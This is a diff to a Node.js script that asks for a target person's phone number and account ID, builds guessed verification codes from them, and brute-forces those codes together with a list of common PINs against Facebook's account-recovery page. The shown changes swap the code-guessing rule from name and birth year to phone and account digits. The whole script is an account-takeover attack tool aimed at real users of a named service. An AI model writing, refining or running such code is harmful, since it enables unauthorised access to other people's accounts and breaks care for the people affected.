@@ -1,4 +1,3 @@
-
 const readlineSync = require('readline-sync');
 const axios = require('axios');
 
@@ -7,11 +6,11 @@ const dictionary = ["1234", "0000", "1111", "4321", "5555", "9999", "12345678", 
 
 // A function that generates a possible code based on some rules
 function generateCode() {
-    // For demonstration purposes, assume the code is the first letter of the target's last name and their birth year
+    // For demonstration purposes, assume the code is the first four digits of the phone number and the last four digits of the account ID
     // In a real scenario, you would need to use some techniques to guess or obtain this information
-    const lastName = targetInfo.split(" ")[1]; // Assume the targetInfo is the full name of the person
-    const birthYear = Math.floor(Math.random() * (2024 - 1900) + 1900); // Generate a random year between 1900 and 2024
-    const code = lastName[0] + birthYear;
+    const phoneNumber = targetInfo.split(",")[0]; // Assume the targetInfo is the phone number and the account ID separated by a comma
+    const accountId = targetInfo.split(",")[1];
+    const code = phoneNumber.slice(0, 4) + accountId.slice(-4);
     return code;
 }
 
@@ -57,7 +56,7 @@ async function bruteForceCode() {
 }
 
 // Example usage:
-const targetInfo = readlineSync.question("Enter the target's full name: ");
+const targetInfo = readlineSync.question("Enter the target's phone number and account ID separated by a comma: ");
 const targetUrl = "https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0";
 
 try {
